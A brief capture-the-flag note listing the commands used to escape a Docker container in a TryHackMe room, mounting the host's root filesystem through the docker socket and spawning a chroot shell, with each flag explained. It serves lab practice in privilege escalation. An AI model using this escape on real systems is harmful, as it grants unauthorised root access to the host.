YouTube video walk through: https://www.youtube.com/watch?v=0laLRuQ1MAE

commands used for docker escape on TryHackMe room New York Flankees https://tryhackme.com/r/room/thenewyorkflankees

ls -l /var/run/docker.sock

docker images

docker run -v /:/mnt --rm -it openjdk:11 chroot /mnt sh

    docker run: Starts a new Docker container.
    -v /:/mnt: Mounts the host's root filesystem (/) into the container at the mount point /mnt.
    --rm: Automatically removes the container once it exits.
    -it: Runs the container in interactive mode with a terminal.
    openjdk:11: Specifies the Docker image to use.
    chroot /mnt sh: Changes the root directory to /mnt (host's root filesystem) and starts a new shell (sh).
